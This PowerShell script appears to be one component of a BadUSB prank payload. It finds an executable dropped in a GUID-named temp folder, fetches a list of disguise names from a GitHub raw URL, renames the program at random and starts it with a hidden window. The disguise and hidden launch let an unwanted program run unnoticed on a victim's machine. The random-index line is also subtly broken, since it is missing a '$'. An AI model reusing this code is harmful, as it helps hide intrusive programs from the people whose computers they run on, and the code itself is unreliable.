$folderPath = "$env:Temp\258A2F13-D6F4-4CC9-A250-BD4CF37E9166"

$exeFile = Get-ChildItem -Path $folderPath -Filter *.exe -File

if (-not $exeFile) {
	exit
}

# Check if the process is already running
if (-not (Get-Process $exeFile.BaseName -ErrorAction SilentlyContinue)) {
	
	$fileNamesRaw = irm https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/FileNames | Out-String
	$names = $fileNamesRaw.Split("`r`n")
	
	$index = Get-Random -Minimum 0 -Maximum names.Length
	$name = $names[$index]

	Rename-Item -Path "$folderPath\$exeFile" -NewName $name
    Start-Process -FilePath "$folderPath\$name" -WindowStyle Hidden
}